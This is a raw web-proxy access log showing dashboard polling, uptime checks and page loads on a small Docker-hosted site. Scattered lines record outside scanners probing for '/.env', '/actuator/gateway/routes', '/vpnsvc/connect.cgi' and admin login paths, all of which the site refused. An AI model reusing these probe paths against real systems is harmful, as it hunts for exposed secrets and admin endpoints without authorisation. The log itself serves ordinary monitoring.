173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/11f98cd8.e511840d.js HTTP/1.1" 200 463285 "-" "-" 27 "dashboard@internal" "-" 431ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /api/version HTTP/1.1" 200 92 "-" "-" 41 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /api/entrypoints HTTP/1.1" 200 767 "-" "-" 40 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 42 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/fonts/nunito-v11-latin-600.b10ecee2.woff2 HTTP/1.1" 200 20084 "-" "-" 44 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/fonts/Eva-Icons.5073ed91.woff2 HTTP/1.1" 200 25896 "-" "-" 43 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/fonts/flUhRq6tzZclQEJ-Vdg-IuiaDsNcIhQ8tQ.0509ab09.woff2 HTTP/1.1" 200 60840 "-" "-" 45 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:21 +0000] "GET /dashboard/fonts/nunito-v11-latin-700.91ae827a.woff2 HTTP/1.1" 200 20128 "-" "-" 46 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:21 +0000] "GET /dashboard/fonts/nunito-v11-latin-regular.de6068bf.woff2 HTTP/1.1" 200 19976 "-" "-" 47 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:21 +0000] "GET /dashboard/fonts/KFOlCnqEu92Fr1MmYUtfBBc-.bb1e4dc6.woff HTTP/1.1" 200 20392 "-" "-" 48 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:21 +0000] "GET /dashboard/statics/providers/docker.svg HTTP/1.1" 200 1808 "-" "-" 49 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:21 +0000] "GET /dashboard/statics/providers/file.svg HTTP/1.1" 200 644 "-" "-" 50 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:21 +0000] "GET /dashboard/statics/icons/favicon.ico HTTP/1.1" 200 10134 "-" "-" 51 "dashboard@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 52 "www@docker" "http://172.28.0.10:80" 32ms
173.48.140.140 - - [15/Dec/2023:07:22:25 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 53 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:30 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 54 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:35 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 55 "api@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 56 "www@docker" "http://172.28.0.10:80" 16ms
173.48.140.140 - - [15/Dec/2023:07:22:40 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 57 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:45 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 58 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:50 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 59 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:55 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 60 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:23:00 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 61 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:23:06 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 62 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:23:11 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 63 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:23:16 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 64 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:23:21 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 65 "api@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 66 "www@docker" "http://172.28.0.10:80" 18ms
173.48.140.140 - - [15/Dec/2023:07:23:26 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 67 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:23:31 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 68 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:23:36 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 69 "api@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 70 "www@docker" "http://172.28.0.10:80" 56ms
173.48.140.140 - - [15/Dec/2023:07:23:41 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 71 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:23:46 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 72 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:23:51 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 73 "api@internal" "-" 0ms
172.104.131.24 - - [15/Dec/2023:07:23:52 +0000] "POST /vpnsvc/connect.cgi HTTP/1.1" 404 19 "-" "-" 74 "-" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:23:56 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 75 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:24:01 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 76 "api@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 77 "www@docker" "http://172.28.0.10:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:24:27 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 78 "api@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 79 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 80 "www@docker" "http://172.28.0.10:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:25:27 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 81 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:25:35 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 82 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:25:35 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 83 "api@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 84 "www@docker" "http://172.28.0.10:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:25:41 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 85 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:25:45 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 86 "api@internal" "-" 0ms
83.97.73.87 - - [15/Dec/2023:07:25:50 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 17 "-" "-" 87 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:25:51 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 88 "api@internal" "-" 0ms
83.97.73.87 - - [15/Dec/2023:07:25:52 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 89 "-" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:25:56 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 90 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:26:01 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 91 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:26:06 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 92 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:26:11 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 93 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:26:16 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 94 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:26:21 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 95 "api@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 96 "www@docker" "http://172.28.0.10:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:26:26 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 97 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:26:31 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 98 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:26:36 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 99 "api@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 100 "www@docker" "http://172.28.0.10:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:26:41 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 101 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:26:46 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 102 "api@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 103 "www@docker" "http://172.28.0.10:80" 30ms
173.48.140.140 - - [15/Dec/2023:07:27:27 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 104 "api@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 105 "www@docker" "http://172.28.0.10:80" 20ms
143.110.222.166 - - [15/Dec/2023:07:27:39 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 106 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 107 "www@docker" "http://172.28.0.10:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:28:27 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 108 "api@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 109 "www@docker" "http://172.28.0.10:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:28:38 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 110 "api@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:28:40 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 111 "api@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 112 "www@docker" "http://172.28.0.10:80" 0ms
83.97.73.87 - - [15/Dec/2023:07:29:28 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 17 "-" "-" 113 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [15/Dec/2023:07:29:31 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 114 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 115 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 116 "www@docker" "http://172.28.0.10:80" 0ms
162.216.149.22 - - [15/Dec/2023:07:30:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 117 "web-to-websecure@internal" "-" 0ms
162.216.149.22 - - [15/Dec/2023:07:30:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 118 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 119 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 120 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 121 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 122 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 123 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 124 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 125 "www@docker" "http://172.28.0.10:80" 0ms
149.28.109.99 - - [15/Dec/2023:07:34:19 +0000] "GET / HTTP/1.0" 301 17 "-" "-" 126 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 127 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 128 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 129 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 130 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 131 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 132 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 133 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 134 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 135 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 136 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 137 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 138 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 139 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 140 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 141 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 142 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 143 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 144 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 145 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 146 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 147 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 148 "www@docker" "http://172.28.0.10:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:44:55 +0000] "GET //actuator/gateway/routes HTTP/2.0" 404 555 "-" "-" 149 "www@docker" "http://172.28.0.10:80" 37ms
173.48.140.140 - - [15/Dec/2023:07:44:59 +0000] "GET /actuator/gateway/routes HTTP/2.0" 404 555 "-" "-" 150 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 151 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 152 "www@docker" "http://172.28.0.10:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:45:57 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 153 "www@docker" "http://172.28.0.10:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:46:01 +0000] "GET /time HTTP/2.0" 301 169 "-" "-" 154 "www@docker" "http://172.28.0.10:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:46:01 +0000] "GET /time/ HTTP/2.0" 200 852 "-" "-" 155 "www@docker" "http://172.28.0.10:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:46:02 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 156 "www@docker" "http://172.28.0.10:80" 7ms
173.48.140.140 - - [15/Dec/2023:07:46:03 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 157 "www@docker" "http://172.28.0.10:80" 4ms
173.48.140.140 - - [15/Dec/2023:07:46:04 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 158 "www@docker" "http://172.28.0.10:80" 4ms
173.48.140.140 - - [15/Dec/2023:07:46:05 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 159 "www@docker" "http://172.28.0.10:80" 5ms
173.48.140.140 - - [15/Dec/2023:07:46:06 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 160 "www@docker" "http://172.28.0.10:80" 4ms
173.48.140.140 - - [15/Dec/2023:07:46:07 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 161 "www@docker" "http://172.28.0.10:80" 5ms
173.48.140.140 - - [15/Dec/2023:07:46:08 +0000] "GET /time/time.php HTTP/2.0" 200 30 "-" "-" 162 "www@docker" "http://172.28.0.10:80" 5ms
159.203.109.206 - - [15/Dec/2023:07:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 163 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 164 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 165 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 166 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 167 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 168 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:07:48:55 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 169 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 170 "www@docker" "http://172.28.0.10:80" 1ms
57.129.23.166 - - [15/Dec/2023:07:49:29 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 171 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:07:49:29 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 172 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 173 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 174 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 175 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 176 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 177 "www@docker" "http://172.28.0.10:80" 1ms
162.142.125.221 - - [15/Dec/2023:07:52:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 178 "-" "-" 0ms
162.142.125.221 - - [15/Dec/2023:07:52:05 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 179 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 180 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 181 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 182 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 183 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 184 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 185 "www@docker" "http://172.28.0.10:80" 1ms
167.94.145.55 - - [15/Dec/2023:07:54:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 186 "-" "-" 0ms
167.94.145.55 - - [15/Dec/2023:07:55:00 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 187 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 188 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 189 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:07:56:00 +0000] "GET /manage/account/login HTTP/1.1" 404 19 "-" "-" 190 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 191 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 192 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 193 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 194 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 195 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 196 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 197 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 198 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 199 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 200 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 201 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 202 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:08:01:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 203 "web-to-websecure@internal" "-" 0ms
35.178.157.24 - - [15/Dec/2023:08:02:20 +0000] "GET /manage/account/login HTTP/1.1" 404 19 "-" "-" 204 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 205 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:08:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 206 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 207 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 208 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 209 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 210 "www@docker" "http://172.28.0.10:80" 1ms
185.180.140.4 - - [15/Dec/2023:08:05:15 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 211 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 212 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 213 "www@docker" "http://172.28.0.10:80" 1ms
35.178.157.24 - - [15/Dec/2023:08:06:08 +0000] "GET /admin/index.html HTTP/1.1" 404 19 "-" "-" 214 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:08:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 215 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 216 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 217 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 218 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 219 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 220 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 221 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 222 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:08:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 223 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:08:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 224 "www@docker" "http://172.28.0.10:80" 1ms
